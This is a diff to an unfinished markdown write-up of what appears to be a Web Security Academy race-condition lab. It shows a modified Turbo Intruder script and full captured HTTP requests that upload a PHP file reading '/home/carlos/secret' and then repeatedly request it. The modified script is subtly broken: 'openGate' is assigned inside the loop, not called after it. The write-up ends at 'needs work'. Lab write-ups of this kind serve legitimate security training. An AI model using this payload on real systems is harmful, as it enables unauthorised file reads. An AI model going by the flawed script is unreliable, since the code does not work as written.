@@ -91,5 +91,101 @@ def queueRequests(target, wordlists):
 def handleResponse(req, interesting):
     table.add(req)
 
+```
+## Modifying the code
+
+Looking at the example, I want to change a few things. First I don't want it to do 30 POST requests, I want 1 POST request for my file, and then 30 get requests for the race condition. First I will write the code with place holders then get the two requests and modify them into the script.
+
+
+I will replace this python code
+```python
+ # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    for i in range(30):
+        engine.queue(target.req, target.baseInput, gate='race1')
 
 ```
+
+With this one containing variable placeholders
+
+```python
+
+    post_req = '''placeholder'''
+
+    get_req = '''placeholder'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(post_req, gate='race1')
+    for x in range(30):
+        engine.queue(get_req, gate='race1')
+        engine.openGate='race1'
+```
+
+now I need to get the POST request from my proxy history
+
+```
+POST /my-account/avatar HTTP/1.1
+Host: acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
+Cookie: session=hSVrEyCK3amLHtv1GtLohmt2rfO30rNF
+Content-Length: 473
+Cache-Control: max-age=0
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Origin: https://acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RU4sTTBWwQ6yNnY
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundary3RU4sTTBWwQ6yNnY
+Content-Disposition: form-data; name="avatar"; filename="get_secret.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+------WebKitFormBoundary3RU4sTTBWwQ6yNnY
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundary3RU4sTTBWwQ6yNnY
+Content-Disposition: form-data; name="csrf"
+
+AeNj0jwzMKHX2x6HMNFfbxdIEip6p9ad
+------WebKitFormBoundary3RU4sTTBWwQ6yNnY--
+
+```
+
+And then my get request 
+
+```
+GET /files/avatars/get_secret.php HTTP/1.1
+Host: acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
+Cookie: session=hSVrEyCK3amLHtv1GtLohmt2rfO30rNF
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+```
+
+### Putting the code together
+ needs work
